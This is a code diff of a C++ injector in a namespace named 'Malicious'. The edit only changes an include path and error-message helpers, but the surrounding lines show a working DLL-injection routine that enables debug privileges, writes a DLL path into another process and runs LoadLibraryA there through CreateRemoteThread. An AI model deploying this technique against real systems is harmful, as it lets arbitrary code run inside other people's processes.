@@ -1,6 +1,6 @@
 #include "Injector.hpp"
 
-#include <common/Log.hpp>
+#include <log/Log.hpp>
 using namespace System;
 
 namespace Malicious
@@ -14,7 +14,7 @@ namespace Malicious
 								   SE_DEBUG_NAME, // define the name of the privilege 
                                    &Debug_Privileges.Privileges[0].Luid)) // will get the LUID value into this variable
         {	
-            throw InjectionError("LookupPrivilegeValue failed : "+toString(GetLastError()));
+            throw InjectionError("LookupPrivilegeValue failed : "+Common::toString(GetLastError()));
         }
 
 	    DWORD err = 0;
@@ -23,7 +23,7 @@ namespace Malicious
                                TOKEN_ADJUST_PRIVILEGES, //set the desired access
                                &hToken)) // handle to the token will be held here 
         {
-            InjectionError injectionError("OpenProcessToken failed : "+toString(GetLastError()));
+            InjectionError injectionError("OpenProcessToken failed : "+Common::toString(GetLastError()));
 		    if (hToken)
             {
         	    CloseHandle (hToken);
@@ -40,7 +40,7 @@ namespace Malicious
 								    NULL,
 								    NULL))
         {
-            InjectionError injectionError("AdjustTokenPrivileges failed : "+toString(GetLastError()));
+            InjectionError injectionError("AdjustTokenPrivileges failed : "+Common::toString(GetLastError()));
 		    if (hToken)
             {
         	    CloseHandle (hToken);
@@ -59,13 +59,13 @@ namespace Malicious
 		HMODULE hLocKernel32 = GetModuleHandle("Kernel32");
 		if(hLocKernel32 == NULL)
 		{
-			throw InjectionError("GetModuleHandle failed : "+toString(GetLastError()));
+			throw InjectionError("GetModuleHandle failed : "+Common::toString(GetLastError()));
 		}
 
 		FARPROC hLocLoadLibrary = GetProcAddress(hLocKernel32, "LoadLibraryA");
 		if(hLocLoadLibrary == NULL)
 		{
-			throw InjectionError("GetProcAddress failed : "+toString(GetLastError()));
+			throw InjectionError("GetProcAddress failed : "+Common::toString(GetLastError()));
 		}
 
         SetDebugPrivileges();
@@ -74,26 +74,26 @@ namespace Malicious
 		//HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 		if(hProc == NULL)
 		{
-			throw InjectionError("OpenProcess failed : "+toString(GetLastError()));
+			throw InjectionError("OpenProcess failed : "+Common::toString(GetLastError()));
 		}
 
 		dll += '\0';
 		LPVOID hRemoteMem = VirtualAllocEx(hProc, NULL, dll.size(), MEM_COMMIT, PAGE_READWRITE);
 		if(hRemoteMem == NULL)
 		{
-			throw InjectionError("VirtualAllocEx failed : "+toString(GetLastError()));
+			throw InjectionError("VirtualAllocEx failed : "+Common::toString(GetLastError()));
 		}
 
 		SIZE_T numBytesWritten;
 		if(!WriteProcessMemory(hProc, hRemoteMem, (void *)dll.c_str(), dll.size(), &numBytesWritten))
 		{
-			throw InjectionError("WriteProcessMemory failed : "+toString(GetLastError()));
+			throw InjectionError("WriteProcessMemory failed : "+Common::toString(GetLastError()));
 		}
 		
 		HANDLE hRemoteThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)hLocLoadLibrary, hRemoteMem, 0, 0);
 		if(hRemoteThread == NULL)
 		{
-			throw InjectionError("CreateRemoteThread failed : "+toString(GetLastError()));
+			throw InjectionError("CreateRemoteThread failed : "+Common::toString(GetLastError()));
 		}
 	}
 
